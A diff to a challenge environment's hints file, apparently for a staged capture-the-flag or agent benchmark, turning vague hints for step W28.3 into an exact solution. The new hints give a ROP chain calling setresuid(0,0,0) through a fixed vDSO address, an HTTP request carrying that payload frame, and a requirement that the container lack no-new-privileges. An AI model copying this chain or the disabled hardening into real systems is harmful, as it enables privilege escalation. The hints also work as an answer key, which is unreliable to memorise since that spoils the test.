@@ -1137,10 +1137,15 @@ hints:
     - kind: client_route
       id: process.release-confirmation
   W28.3:
-    h1: Begin with the constrained engineering utility and its control-authority exchange. Its published client
-      document exposes the control authority operation, so use that ordinary contract instead of guessing a path.
-    h2: Treat this as control-flow recovery within a deliberately small executable surface. Carry forward only earned
-      identities and record bindings; possession of a copied identifier alone does not cross the next boundary.
+    h1: POST /api/control-authority with {"operation":"issue","session_id":"<W28.1 session>","length":320,
+      "frame_b64":"<frame>"}. Frame is 320 bytes: same prefix as W28.2 but chain is 12 u64 values calling
+      setresuid(0,0,0) via vDSO, then issue_client(immutable_issuer_record, request_correlation).
+    h2: Chain (96 bytes at offset 224): pop_rdi,0, pop_rsi,0, pop_rdx,0, vdso_setresuid, pop_rdi,
+      base+issuer_record_off, pop_rsi, base+request_correlation_off, base+issue_client_off. vdso_setresuid =
+      0x7fff000007B0 (fixed vDSO base + setresuid_syscall_offset from relationship.json).
+    h2b: The binary gains root via cap_setuid file capability, connects to /run/arwc/control-issuer.sock,
+      sends the issuer request, and returns the control_client token. The engineering container must NOT have
+      no-new-privileges:true (file capabilities would be blocked).
     h3: Locate the control authority operation in the published client reference. Replay the preceding evidence
       through the next documented boundary and verify the downstream service, not the client, records the outcome.
     references:
